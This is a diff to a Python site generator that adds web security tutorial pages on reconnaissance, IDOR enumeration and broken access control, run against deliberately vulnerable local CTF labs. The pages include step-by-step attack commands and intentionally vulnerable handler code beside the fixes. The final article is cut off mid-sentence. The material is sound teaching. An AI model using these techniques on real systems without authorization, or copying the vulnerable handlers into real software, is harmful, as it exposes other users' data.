@@ -41,14 +41,25 @@ PAGE_HISTORY = {
     "manual/": ("2026-09-15", "ac83a7c5f7312b95"),
     "pitch/": ("2026-09-10", "57ee2a579d40f90e"),
     "demo/": ("2026-09-12", "729de49b887b5c3f"),
-    "guides/": ("2026-09-09", "0e4d298584ce7b5e"),
-    "blog/": ("2026-09-13", "7ab0f165d3344232"),
-    "guides/drive-a-browser-session/": ("2026-09-02", "148a857cf6c0d8e7"),
-    "guides/first-box/": ("2026-08-30", "c52289c78be574db"),
-    "guides/review-a-pull-request/": ("2026-08-30", "0bbf47c079810ec7"),
-    "guides/write-a-box-policy/": ("2026-09-13", "2ddec5bdd360277d"),
-    "guides/watch-the-browser/": ("2026-09-13", "1878eb38306a2423"),
-    "guides/authorized-web-security-testing/": ("2026-09-09", "6280e1e26326ec3a"),
+    "guides/": ("2026-09-15", "1cfa5ff7f504c618"),
+    "blog/": ("2026-09-15", "e6bef559cb5cc1b6"),
+    "guides/recon-and-idor/": ("2026-09-15", "3724f8bf21f0170d"),
+    "guides/broken-access-control/": ("2026-09-15", "dec6df369429ae8e"),
+    "guides/jwt-attacks/": ("2026-09-15", "0b3fc4ae463e60f9"),
+    "guides/sql-injection/": ("2026-09-15", "1347ab6ad9b35263"),
+    "guides/injection-beyond-sql/": ("2026-09-15", "58420a2d971ae3a5"),
+    "guides/browser-as-a-weapon/": ("2026-09-15", "5dbce398406589f6"),
+    "guides/ssrf-and-file-attacks/": ("2026-09-15", "0408e264337bea37"),
+    "guides/http-protocol-attacks/": ("2026-09-15", "84bfef80b24ab2b0"),
+    "guides/logic-time-and-crypto/": ("2026-09-15", "6011aec60de33ecb"),
+    "guides/exploit-chains/": ("2026-09-15", "e6c14587b663e935"),
+    "guides/cheatsheet/": ("2026-09-15", "52500b0fb9da625d"),
+    "guides/drive-a-browser-session/": ("2026-09-15", "1e924e7680870af5"),
+    "guides/first-box/": ("2026-09-15", "42cb89a3f707dc02"),
+    "guides/review-a-pull-request/": ("2026-09-15", "b25f2bd2fa8efe3c"),
+    "guides/write-a-box-policy/": ("2026-09-15", "d459b41d585b5ac1"),
+    "guides/watch-the-browser/": ("2026-09-15", "18221347ce0ba55a"),
+    "guides/authorized-web-security-testing/": ("2026-09-15", "21223e318fd73f95"),
     "blog/the-h5i-loop/": ("2026-09-13", "78a64276929d8202"),
     "blog/the-environment-is-the-sandbox/": ("2026-09-13", "c0003c9a5de6bc53"),
     "blog/choosing-agent-isolation/": ("2026-09-13", "0eff3260305a64d7"),
@@ -192,11 +203,12 @@ def schema_for(item):
             {"@type": "ListItem", "position": 2, "name": item["section"].title(), "item": f"https://h5i.dev/{item['section']}/"},
             {"@type": "ListItem", "position": 3, "name": item["h1"], "item": url},
         ]},
-        {"@type": "FAQPage", "mainEntity": [
+    ]
+    if item.get("faq"):
+        graph.append({"@type": "FAQPage", "mainEntity": [
             {"@type": "Question", "name": q, "acceptedAnswer": {"@type": "Answer", "text": a}}
             for q, a in item["faq"]
-        ]},
-    ]
+        ]})
     return {"@context": "https://schema.org", "@graph": graph}
 
 
@@ -214,8 +226,9 @@ def article_page(item):
     url = f"https://h5i.dev/{item['section']}/{item['slug']}/"
     faq = "".join(
         f'<details class="faq-item"><summary>{q}</summary><div class="faq-answer">{a}</div></details>'
-        for q, a in item["faq"]
+        for q, a in item.get("faq", ())
     )
+    faq = f'<h2 id="faq">Questions that come up</h2><div class="faq-list">{faq}</div>' if faq else ""
     nxt = item["next"]
     return f"""{head(item['title'], meta_description(item), url, schema_for(item),
                     social_image=item.get('social_image', SOCIAL_IMAGE),
@@ -225,7 +238,7 @@ def article_page(item):
 <h1>{item['h1']}</h1><p class="post-deck">{item['deck']}</p>
 <div class="post-meta"><span>{item['time']} read</span><span>{item['tags']}</span></div></header>
 {item['body']}
-<h2 id="faq">Questions that come up</h2><div class="faq-list">{faq}</div>
+{faq}
 <a class="next-up" href="{nxt[0]}"><span class="label">{nxt[1]}</span><h3>{nxt[2]}</h3><p>{nxt[3]}</p></a>
 <div class="post-cta"><h3>{item['cta'][0]}</h3><p>{item['cta'][1]}</p>
 <div class="hero-actions"><a class="btn btn-primary" href="{item['cta'][2]}">{item['cta'][3]}</a></div></div>
@@ -286,13 +299,13 @@ SESSION = {
         ("What happens if the browser dies mid-task?", "The session is recorded as died, with a time, and the next verb exits 69. Nothing restarts automatically. Use --restore to carry the old session's storage into a new session with a new id; the inheritance is written into the new record and the old id is never reused."),
         ("Does the engine run page JavaScript?", "Only if you ask for it with --script. Off is the default because with no script realm there is no delivery channel for page-borne injection at all. Turning it on is a decision, not a default you inherit."),
     ],
-    "next": ("/guides/watch-the-browser/", "Next guide", "Watch the page, then take the controls", "Put the browser beside the dev server and hand control between agent and human."),
+    "next": ("/guides/authorized-web-security-testing/", "Next guide", "Run an authorized web security test with an AI agent", "Scope the session to a target you may test, then capture, replay, and compare its traffic."),
     "cta": ("Open a session in one command", "No project, no repository, no configuration. h5i browser open takes a URL and gives you an id.", "/manual/#h5i-browser", "Read the session reference"),
 }
 
 
 FIRST_BOX = {
-    "section": "guides", "slug": "first-box", "eyebrow": "Guide 02 / The box",
+    "section": "guides", "slug": "first-box", "eyebrow": "Guide 03 / The box",
     "time": "9 min", "tags": "Install &middot; Create &middot; Export",
     "title": "Your first h5i box | h5i",
     "h1": "Take one coding task from prompt to reviewed patch",
@@ -379,7 +392,7 @@ $ h5i box gc''')}
 
 
 REVIEW_PR = {
-    "section": "guides", "slug": "review-a-pull-request", "eyebrow": "Guide 04 / Untrusted code",
+    "section": "guides", "slug": "review-a-pull-request", "eyebrow": "Guide 06 / Untrusted code",
     "time": "9 min", "tags": "Pull request &middot; Detached box &middot; Review",
     "title": "Review a pull request in an h5i box | h5i",
     "h1": "Run the pull request before you trust the pull request",
@@ -447,7 +460,7 @@ $ h5i box gc''')}
 
 
 POLICY = {
-    "section": "guides", "slug": "write-a-box-policy", "eyebrow": "Guide 05 / Policy",
+    "section": "guides", "slug": "write-a-box-policy", "eyebrow": "Guide 04 / Policy",
     "time": "10 min", "tags": "Isolation &middot; Egress &middot; Resources",
     "title": "Write an h5i box policy | h5i", "h1": "Write down what the agent may reach",
     "description": "Define an h5i profile with an explicit isolation tier, filesystem grants, default-deny networking, and resource limits, then verify it.",
@@ -534,7 +547,7 @@ $ h5i box log policy-check''')}
 
 
 BROWSER = {
-    "section": "guides", "slug": "watch-the-browser", "eyebrow": "Guide 06 / Takeover",
+    "section": "guides", "slug": "watch-the-browser", "eyebrow": "Guide 05 / Takeover",
     "time": "9 min", "tags": "Dev server &middot; Viewer &middot; Control lock",
     "title": "Watch an agent's browser in an h5i box | h5i",
     "h1": "Watch the page, then take the controls",
@@ -803,7 +816,7 @@ INJECTION = {
 
 
 WEB_SECURITY_GUIDE = {
-    "section": "guides", "slug": "authorized-web-security-testing", "eyebrow": "Guide 06 / Web security",
+    "section": "guides", "slug": "authorized-web-security-testing", "eyebrow": "Guide 02 / Web security",
     "published": "2026-09-09",
     "time": "12 min", "tags": "Pentesting &middot; CTF &middot; Red team",
     "title": "AI web security testing with h5i | Authorized guide",
@@ -1153,9 +1166,2598 @@ LOOP = {
 }
 
 
-ARTICLES = [SESSION, FIRST_BOX, REVIEW_PR, POLICY, BROWSER, WEB_SECURITY_GUIDE,
-            AI_PENTESTING_TOOLS, LOOP, ENVIRONMENT, TIERS, EVIDENCE, INJECTION, BURP_COMPARISON,
-            ZAP_COMPARISON, CAIDO_COMPARISON]
+# The five chapters of the h5i web security course, whose 42 runnable labs
+# live in h5i-dev/h5i-tutorial. Numbered in the book ("1. The workbench",
+# "## 1.4 Replay"); here they are pages rather than a numbered part of
+# anything, so the numbers are off the titles and the headings.
+
+
+
+
+# The h5i web security tutorial, ten articles that walk the labs in
+# h5i-dev/h5i-tutorial. Published as a numbered series whose first part is on
+# Medium; here they are pages in order, so the numbers are off the titles.
+
+
+RECON = {
+    "section": "guides", "slug": "recon-and-idor", "published": "2026-09-13",
+    "eyebrow": "Tutorial 01 / Recon", "time": "10 min",
+    "tags": "Recon &middot; IDOR &middot; Labs 5&ndash;7",
+    "title": "Recon and IDOR | h5i web security tutorial",
+    "h1": "Recon and IDOR",
+    "description": "A beginner-friendly CTF tutorial: discover hidden endpoints, test object-level authorization, and learn why an unguessable URL is not an access control.",
+    "meta": "Discover hidden endpoints in an application, then test object-level authorization and see why an unguessable URL is not an access control.",
+    "deck": "A beginner-friendly CTF tutorial: discover hidden endpoints, test object-level authorization, and learn why an unguessable URL is not an access control.",
+    "next": ("/guides/broken-access-control/", "Next in the series", "Broken Access Control", "Compare two logged-in users, test authorization directly with --as, and find the fields a user interface never sends."),
+    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
+    "body": r"""<p>In <a href="https://medium.com/@Koukyosyumei/web-security-tutorial-with-h5i-part-1-http-request-tampering-39c4a0857b85">Part 1 on Medium</a>, we changed URL parameters, form fields, cookies, and HTTP methods. In every case, the vulnerable request was already in front of us.</p>
+<p>Real applications are less helpful. Before testing a request, we usually have to discover it. We then have to ask not only whether an endpoint requires a login, but whether the logged-in user is allowed to access the particular object they requested.</p>
+<p>In this article, we will use <a href="https://github.com/h5i-dev/h5i">h5i</a> and Labs 5–7 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> to learn two fundamental web-security skills:</p>
+<ul>
+<li><strong>Reconnaissance:</strong> mapping the application before attacking it.</li>
+<li><strong>Object-level authorization testing:</strong> checking whether one user can access another user's data.</li>
+</ul>
+<p>All three targets are deliberately vulnerable applications that run only on <code>127.0.0.1</code>. Do not test these techniques against systems unless you own them or have explicit permission.</p>
+<h2 id="before-we-begin">Before we begin</h2>
+<p>This article continues from <a href="https://medium.com/@Koukyosyumei/web-security-tutorial-with-h5i-part-1-http-request-tampering-39c4a0857b85">Part 1 on Medium</a>. You need Python 3.11 or later, h5i, and its <code>websec</code> plugin. The complete setup instructions are in the <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec#1-setup">tutorial repository</a>.</p>
+<pre><code class="language-bash">$ git clone https://github.com/h5i-dev/h5i-tutorial.git
+$ cd h5i-tutorial/websec
+$ h5i websec --help
+</code></pre>
+<p>The workflow remains the same:</p>
+<ol>
+<li>Open a page with capture enabled.</li>
+<li>Inspect the recorded requests and responses.</li>
+<li>Replay a request with one deliberate change.</li>
+<li>Compare the result.</li>
+</ol>
+<h2 id="what-is-reconnaissance">What is reconnaissance?</h2>
+<p><strong>Reconnaissance</strong>, usually shortened to <strong>recon</strong>, means learning what an application exposes: pages, API endpoints, parameters, versions, roles, and other reachable services.</p>
+<p>The visible navigation is only one source. Useful information also appears in HTML comments, JavaScript files, HTTP headers, error messages, API documentation, <code>robots.txt</code>, and old endpoints that were hidden but never removed.</p>
+<p>Recon is not just preparation for the “real” work. An endpoint that the development team forgot may be the vulnerability itself.</p>
+<h2 id="lab-5-follow-the-applications-trail">Lab 5: follow the application’s trail</h2>
+<p>Start the intranet lab:</p>
+<pre><code class="language-bash">$ ./run.sh 05
+</code></pre>
+<p>It prints <code>http://127.0.0.1:9050</code>. Open the homepage and record its traffic:</p>
+<pre><code class="language-bash">$ h5i browser open 'http://127.0.0.1:9050/' \
+  --session lab05 --new --capture
+$ h5i browser markdown --session lab05
+</code></pre>
+<p>The rendered page contains links to <code>/docs</code> and <code>/api/v3/whoami</code>. The API answers with <code>401 Unauthorized</code> because we do not have a bearer token.</p>
+<p>It would be easy to stop there. Instead, read both the rendered page and the original HTTP response:</p>
+<pre><code class="language-bash">$ h5i websec show res_0 --session lab05 --raw
+</code></pre>
+<p>Near the end of the HTML is a comment that the browser does not display as page text:</p>
+<pre><code class="language-html">&lt;!-- TODO(dana): kill the v0 API before the audit --&gt;
+</code></pre>
+<p>An HTML comment is not secret. Anyone who receives the page can read its source. This one tells us that an older API version may still exist.</p>
+<h3 id="check-robotstxt">Check <code>robots.txt</code></h3>
+<p><code>robots.txt</code> tells search-engine crawlers which paths they should avoid. It is public and does not prevent a person from requesting those paths.</p>
+<p>Replay the captured homepage request, changing only its path:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab05 --set path=/robots.txt
+$ h5i websec show res_1 --session lab05 --raw
+</code></pre>
+<p>The response contains:</p>
+<pre><code class="language-text">User-agent: *
+Disallow: /internal/
+Disallow: /api/v0/
+</code></pre>
+<p><code>Disallow</code> means “please do not index this path,” not “deny access to this path.” In practice, <code>robots.txt</code> can become a public list of interesting locations.</p>
+<p>The <code>/docs</code> page also points to <code>/internal/notes.md</code>. Request it by replaying the same captured request:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab05 --set path=/internal/notes.md
+$ h5i websec show res_2 --session lab05 --raw
+</code></pre>
+<p>The notes explain that version 3 requires authentication, while version 0 predates it. They also identify employee <code>1</code> as the service account.</p>
+<p>We can now test the old endpoint directly:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab05 \
+  --set path=/api/v0/employee/1
+$ h5i websec show res_3 --session lab05 --raw
+</code></pre>
+<p>The response contains the service account and:</p>
+<pre><code class="language-text">FLAG{recon_trail}
+</code></pre>
+<p>The precise response number may differ if you sent additional requests. Use the <code>seq</code> value printed by <code>replay</code> to find the corresponding <code>res_N</code>.</p>
+<h3 id="why-did-this-work">Why did this work?</h3>
+<p>The application protects its current API:</p>
+<pre><code class="language-python">@app.get(&quot;/api/v3/whoami&quot;)
+def whoami(req):
+    return js({&quot;error&quot;: &quot;missing bearer token&quot;}, 401)
+</code></pre>
+<p>But the deprecated API remains routable and contains no authorization check:</p>
+<pre><code class="language-python">@app.get(&quot;/api/v0/employee/(\\d+)&quot;)
+def employee_v0(req, emp_id):
+    if emp_id == &quot;1&quot;:
+        return js({&quot;id&quot;: 1, &quot;name&quot;: &quot;svc-deploy&quot;, &quot;notes&quot;: FLAG})
+</code></pre>
+<p>Calling an API “deprecated” does not disable it. The old route must be removed, or it must pass through the same centralized authentication and authorization controls as the new route.</p>
+<h3 id="keep-the-map">Keep the map</h3>
+<p>h5i can summarize everything reached during the session:</p>
+<pre><code class="language-bash">$ h5i websec sitemap --session lab05 --human
+$ h5i websec requests --session lab05 --human
+</code></pre>
+<p>The sitemap is useful because it turns recon into a reproducible artifact instead of a list you try to remember.</p>
+<h2 id="authentication-is-not-authorization">Authentication is not authorization</h2>
+<p>Before the next lab, we need to separate two related ideas.</p>
+<p><strong>Authentication</strong> asks: <em>Who are you?</em></p>
+<p><strong>Authorization</strong> asks: <em>Are you allowed to do this?</em></p>
+<p>A website may correctly identify Alice and still accidentally let Alice read Bob’s invoice. That is an authorization failure.</p>
+<p>When the object is selected using an identifier supplied by the client—such as <code>/invoice/1041</code>, <code>?document_id=7</code>, or a UUID—and the server does not verify ownership, the bug is commonly called an <strong>insecure direct object reference (IDOR)</strong>. It is also described more generally as <strong>broken object-level authorization (BOLA)</strong>.</p>
+<h2 id="lab-6-enumerate-sequential-invoice-ids">Lab 6: enumerate sequential invoice IDs</h2>
+<p>Start the invoice lab:</p>
+<pre><code class="language-bash">$ ./run.sh 06
+</code></pre>
+<p>The homepage tells us that we are account <code>77</code> and that our latest invoice is <code>1041</code>. Open that invoice:</p>
+<pre><code class="language-bash">$ h5i browser open \
+  'http://127.0.0.1:9060/api/invoice?id=1041' \
+  --session lab06 --new --capture
+$ h5i websec show res_0 --session lab06 --raw
+</code></pre>
+<p>The response includes both the invoice ID and its account:</p>
+<pre><code class="language-json">{
+  &quot;viewer_account&quot;: 77,
+  &quot;id&quot;: 1041,
+  &quot;account&quot;: 77,
+  &quot;total&quot;: 41
+}
+</code></pre>
+<p>Now change the invoice ID while keeping our identity unchanged:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab06 --set query.id=1040
+</code></pre>
+<p>One changed value is enough to form the important question: <em>Does the server verify that account 77 owns the requested invoice?</em></p>
+<p>Because the IDs are sequential, we can inspect nearby values. The replay command returns JSON containing the response status and size, so we do not need to print every body:</p>
+<pre><code class="language-bash">$ for id in $(seq 1000 1050); do
+    printf '%s ' &quot;$id&quot;
+    h5i websec replay req_0 --session lab06 \
+      --reset-budget --set &quot;query.id=$id&quot; |
+      python3 -c 'import json,sys; r=json.load(sys.stdin)[&quot;response&quot;]; print(r[&quot;status&quot;], r[&quot;bytes&quot;])'
+  done
+</code></pre>
+<p>Most responses form similar clusters. Invoice <code>1004</code> is larger because it has an additional memo. Replay that ID and read the new response:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab06 --reset-budget \
+  --set query.id=1004
+</code></pre>
+<p>Note the printed <code>seq</code>, then replace <code>N</code> below with that number:</p>
+<pre><code class="language-bash">$ h5i websec show res_N --session lab06 --raw
+</code></pre>
+<p>The body shows an invoice belonging to account <code>1</code>, even though <code>viewer_account</code> is still <code>77</code>. Its memo contains:</p>
+<pre><code class="language-text">FLAG{idor_sequential}
+</code></pre>
+<h3 id="what-does-reset-budget-do">What does <code>--reset-budget</code> do?</h3>
+<p>h5i limits the network allowance of a browser session so that untrusted page code cannot make requests forever. A deliberate security-testing loop may need more requests than a normal page.</p>
+<p><code>--reset-budget</code> renews that allowance for the replay. Use it for sweeps with more than a handful of requests. Otherwise, a stopped sweep can look like evidence that no endpoint exists.</p>
+<h3 id="why-did-this-work_1">Why did this work?</h3>
+<p>The vulnerable handler reads the current account and the requested invoice:</p>
+<pre><code class="language-python">who = req.cookies.get(&quot;account&quot;, &quot;77&quot;)
+row = INVOICES.get(wanted)
+return js({&quot;viewer_account&quot;: int(who), **row})
+</code></pre>
+<p>The application knows who is viewing the invoice. It also knows which account owns the invoice. It never compares them.</p>
+<p>That missing comparison is the vulnerability.</p>
+<p>A safer version checks ownership before returning the record:</p>
+<pre><code class="language-python">row = INVOICES.get(wanted)
+if not row or row[&quot;account&quot;] != session.account:
+    return js({&quot;error&quot;: &quot;no such invoice&quot;}, 404)
+</code></pre>
+<p>Returning the same <code>404 Not Found</code> for both nonexistent and unauthorized objects also avoids confirming that another customer’s invoice exists.</p>
+<h2 id="lab-7-why-uuids-do-not-solve-idor">Lab 7: why UUIDs do not solve IDOR</h2>
+<p>Sequential IDs are easy to enumerate, so a developer might replace them with random-looking identifiers such as UUIDs.</p>
+<p>This is useful defense in depth, but it is not authorization. If an identifier leaks through another endpoint, anyone who obtains it can still request the object.</p>
+<p>Start the document lab:</p>
+<pre><code class="language-bash">$ ./run.sh 07
+</code></pre>
+<p>We belong to the <code>acme</code> tenant. Open the search endpoint:</p>
+<pre><code class="language-bash">$ h5i browser open \
+  'http://127.0.0.1:9070/api/search?q=report' \
+  --session lab07 --new --capture
+$ h5i websec show res_0 --session lab07 --raw
+</code></pre>
+<p>The response contains a result from a different tenant:</p>
+<pre><code class="language-json">{
+  &quot;q&quot;: &quot;report&quot;,
+  &quot;hits&quot;: [
+    {
+      &quot;id&quot;: &quot;0d6d25cc-816e-a822-33f4-43e61907948c&quot;,
+      &quot;title&quot;: &quot;TPS Report&quot;,
+      &quot;tenant&quot;: &quot;initech&quot;
+    }
+  ]
+}
+</code></pre>
+<p>The UUID would be impractical to guess. We did not guess it—the search endpoint gave it to us.</p>
+<p>The lab asks us to find Initech’s break-glass document. Search for the title:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab07 --set query.q=glass
+$ h5i websec show res_1 --session lab07 --raw
+</code></pre>
+<p>The result reveals another Initech document ID. Copy that ID into the document path:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab07 \
+  --set path=/api/document/94e1d935-a208-f5e8-e5b9-b8e47e375110
+$ h5i websec show res_2 --session lab07 --raw
+</code></pre>
+<p>The server returns the cross-tenant document and:</p>
+<pre><code class="language-text">FLAG{idor_uuid}
+</code></pre>
+<h3 id="two-authorization-failures">Two authorization failures</h3>
+<p>The lab contains two separate mistakes.</p>
+<p>First, search is global rather than tenant-scoped:</p>
+<pre><code class="language-python">hits = [
+    {&quot;id&quot;: k, &quot;title&quot;: v[&quot;title&quot;], &quot;tenant&quot;: v[&quot;tenant&quot;]}
+    for k, v in DOCS.items()
+    if q and q in v[&quot;title&quot;].lower()
+]
+</code></pre>
+<p>Second, the read endpoint treats possession of the UUID as permission:</p>
+<pre><code class="language-python">row = DOCS.get(doc_id)
+return js({&quot;id&quot;: doc_id, **row})
+</code></pre>
+<p>Both queries need a tenant condition. Fixing only the search leak would leave the document endpoint vulnerable to identifiers exposed through logs, links, browser history, notifications, exports, or another future endpoint.</p>
+<p>A secure object lookup includes the authorization boundary itself:</p>
+<pre><code class="language-python">row = DOCS.get(doc_id)
+if not row or row[&quot;tenant&quot;] != session.tenant:
+    return js({&quot;error&quot;: &quot;not found&quot;}, 404)
+</code></pre>
+<p>The general rule is simple: <strong>possession of an object identifier is not permission to access the object.</strong></p>
+<h2 id="a-reusable-testing-method">A reusable testing method</h2>
+<p>The three labs suggest a workflow that applies to larger applications.</p>
+<h3 id="1-map-before-probing">1. Map before probing</h3>
+<p>Use the application normally with capture enabled. Then inspect:</p>
+<ul>
+<li>the rendered page and raw HTML;</li>
+<li>recorded API requests;</li>
+<li><code>robots.txt</code> and <code>sitemap.xml</code>;</li>
+<li>documentation and API version prefixes;</li>
+<li>error messages, redirects, headers, and JavaScript files.</li>
+</ul>
+<p>Keep the resulting endpoints in <code>h5i websec sitemap</code>.</p>
+<h3 id="2-identify-actors-and-objects">2. Identify actors and objects</h3>
+<p>Write down the application’s users and roles: anonymous visitor, customer, moderator, administrator, support agent, or another tenant.</p>
+<p>Then identify its objects: invoices, documents, orders, tickets, files, or API keys.</p>
+<h3 id="3-change-one-object-identifier">3. Change one object identifier</h3>
+<p>Capture a legitimate request and change only its object ID. Test:</p>
+<ul>
+<li>the previous and next sequential IDs;</li>
+<li>an ID belonging to another account;</li>
+<li>an ID found through search, autocomplete, exports, or activity feeds;</li>
+<li>read, update, and delete operations on the same object.</li>
+</ul>
+<h3 id="4-confirm-the-impact">4. Confirm the impact</h3>
+<p>A changed response is a lead. A clear cross-account read or write is the finding. Record the original and modified request IDs so another person can reproduce it.</p>
+<h2 id="summary">Summary</h2>
+<p>In Lab 5, public clues led us from the current API to a forgotten, unauthenticated version. In Lab 6, a sequential invoice ID exposed another account’s data. In Lab 7, a search endpoint leaked an unguessable UUID and the document endpoint accepted possession of that UUID as authorization.</p>
+<p>The common lesson is that the visible page is not the whole application, and a valid login is not the end of an authorization decision.</p>
+<p>When you finish, close the sessions and stop the lab servers:</p>
+<pre><code class="language-bash">$ h5i browser close --session lab05
+$ h5i browser close --session lab06
+$ h5i browser close --session lab07
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/broken-access-control/">Broken Access Control</a>, we will test authorization across two logged-in sessions and examine <strong>mass assignment</strong>: what happens when a client sends fields that the user interface never offered.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial: Web application security</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/05-recon-trail">Lab 5: Recon trail</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/06-idor-sequential">Lab 6: Sequential IDOR</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/07-idor-uuid">Lab 7: UUID IDOR</a></li>
+</ul>""",
+}
+
+
+ACCESS = {
+    "section": "guides", "slug": "broken-access-control", "published": "2026-09-15",
+    "eyebrow": "Tutorial 02 / Access control", "time": "9 min",
+    "tags": "Authorization &middot; Mass assignment &middot; Labs 8&ndash;9",
+    "title": "Broken Access Control | h5i web security tutorial",
+    "h1": "Broken Access Control",
+    "description": "A beginner-friendly CTF tutorial: compare two logged-in users, test authorization directly, and find fields the user interface never sends.",
+    "meta": "Compare two logged-in users, test authorization directly with --as, and find the fields a user interface never sends.",
+    "deck": "A beginner-friendly CTF tutorial: compare two logged-in users, test authorization directly, and find fields the user interface never sends.",
+    "next": ("/guides/jwt-attacks/", "Next in the series", "JWT Attacks", "Decode JSON Web Tokens, bypass a missing signature check, crack a weak HMAC secret, and turn a key identifier into a path traversal."),
+    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
+    "body": r"""<p>In <a href="/guides/recon-and-idor/">Recon and IDOR</a>, we discovered forgotten endpoints and used object identifiers to read data belonging to another account. Those attacks had one question underneath them: <em>Does the server check that this user is allowed to access this object?</em></p>
+<p>In this article, we will make that question systematic. Using Labs 8 and 9 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a>, we will:</p>
+<ul>
+<li>replay the same request as two different users;</li>
+<li>distinguish authentication from authorization;</li>
+<li>add a privileged field that the signup form never offered; and</li>
+<li>learn why server-side allowlists matter.</li>
+</ul>
+<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a>, a headless browser whose <code>websec</code> plugin records, edits, and replays the HTTP traffic produced by a browser session.</p>
+<p>Both targets are deliberately vulnerable local applications. Only use these techniques on systems you own or have explicit permission to test.</p>
+<h2 id="before-we-begin">Before we begin</h2>
+<p>This article assumes that h5i and its <code>websec</code> plugin are installed. The complete instructions are in the <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec#1-setup">tutorial repository</a>.</p>
+<pre><code class="language-bash">$ git clone https://github.com/h5i-dev/h5i-tutorial.git
+$ cd h5i-tutorial/websec
+$ h5i websec --help
+</code></pre>
+<h2 id="authentication-and-authorization-are-different-checks">Authentication and authorization are different checks</h2>
+<p><strong>Authentication</strong> establishes an identity: “This request came from Bob.”</p>
+<p><strong>Authorization</strong> applies a rule to that identity: “Bob is an intern, so he cannot read the managers’ quarterly report.”</p>
+<p>A valid session cookie proves only the first statement. Every sensitive endpoint still needs the second check.</p>
+<p>The most direct authorization test is therefore:</p>
+<ol>
+<li>perform an action as a privileged user;</li>
+<li>capture the exact request;</li>
+<li>send that same request with a less privileged user’s credentials; and</li>
+<li>compare the responses.</li>
+</ol>
+<p>Changing only the identity makes the result easy to interpret.</p>
+<h2 id="lab-8-send-alices-request-as-bob">Lab 8: send Alice’s request as Bob</h2>
+<p>Start the ledger lab:</p>
+<pre><code class="language-bash">$ ./run.sh 08
+</code></pre>
+<p>The application has two users:</p>
+<ul>
+<li><code>alice</code>, a manager;</li>
+<li><code>bob</code>, an intern.</li>
+</ul>
+<p>The quarterly report should be restricted to managers. First, create an independent browser session for Alice:</p>
+<pre><code class="language-bash">$ h5i browser open 'http://127.0.0.1:9080/' \
+  --session alice --new --capture
+
+$ h5i websec replay req_0 --session alice --create \
+  --set method=POST \
+  --set path=/login \
+  --set header.Content-Type=application/json \
+  --set json.user=alice
+</code></pre>
+<p><code>--create</code> is required because the captured homepage request was a <code>GET</code> with no JSON body. We are deliberately creating fields that were not in that request.</p>
+<p>The login response sets Alice’s session cookie. Because it belongs to the named <code>alice</code> session, later requests from that session use it automatically.</p>
+<p>Now capture the report request:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session alice --create \
+  --set path=/api/reports/quarterly
+$ h5i websec show res_2 --session alice --raw
+</code></pre>
+<p>The response identifies Alice as a manager and includes the quarterly data. This establishes the expected privileged behavior.</p>
+<p>Next, create a separate session for Bob:</p>
+<pre><code class="language-bash">$ h5i browser open 'http://127.0.0.1:9080/' \
+  --session bob --new --capture
+
+$ h5i websec replay req_0 --session bob --create \
+  --set method=POST \
+  --set path=/login \
+  --set header.Content-Type=application/json \
+  --set json.user=bob
+</code></pre>
+<p>We now have two independent cookie jars. Alice’s session contains Alice’s login cookie; Bob’s contains Bob’s.</p>
+<h3 id="replay-the-same-message-with-another-identity">Replay the same message with another identity</h3>
+<p>Alice’s report request is <code>req_2</code> in the <code>alice</code> session. Send that message using Bob’s session:</p>
+<pre><code class="language-bash">$ h5i websec replay req_2 --session alice --as bob
+</code></pre>
+<p><code>--session alice</code> tells h5i where the recorded message comes from. <code>--as bob</code> tells it which session’s cookies, browser identity, policy, and network receipts should be used to send it.</p>
+<p>The replay prints its <code>seq</code>, and that number belongs to <strong>Bob’s</strong> session, because that is where the message was actually sent from and recorded. Read the body there:</p>
+<pre><code class="language-bash">$ h5i websec show res_2 --session bob --raw
+</code></pre>
+<p>If your <code>seq</code> differs, use the number the replay printed. Reading <code>res_N</code> from the <code>alice</code> session is a common mistake here: it either fails or shows you Alice’s own earlier response, which looks like a finding and is not one.</p>
+<p>The response is still <code>200 OK</code>. More importantly, its body says:</p>
+<pre><code class="language-json">{
+  &quot;as&quot;: &quot;bob&quot;,
+  &quot;role&quot;: &quot;intern&quot;,
+  &quot;revenue&quot;: 4120000,
+  &quot;audit_key&quot;: &quot;FLAG{cross_session_authz}&quot;
+}
+</code></pre>
+<p>The request was genuinely sent as Bob. The server authenticated him correctly and then returned the managers’ report anyway.</p>
+<h3 id="why-did-this-work">Why did this work?</h3>
+<p>The report handler contains an authentication check:</p>
+<pre><code class="language-python">user = SESSIONS.get(req.cookies.get(&quot;sid&quot;, &quot;&quot;))
+if not user:
+    return js({&quot;error&quot;: &quot;sign in&quot;}, 401)
+
+return js({
+    &quot;as&quot;: user,
+    &quot;role&quot;: USERS[user],
+    &quot;revenue&quot;: 4_120_000,
+    &quot;audit_key&quot;: FLAG,
+})
+</code></pre>
+<p>The handler asks whether the caller is signed in. It never checks whether the signed-in user is a manager.</p>
+<p>The user interface does not show Bob a link to the report, but hiding a link is not access control. Bob can still send the underlying HTTP request.</p>
+<p>A correct handler performs both checks:</p>
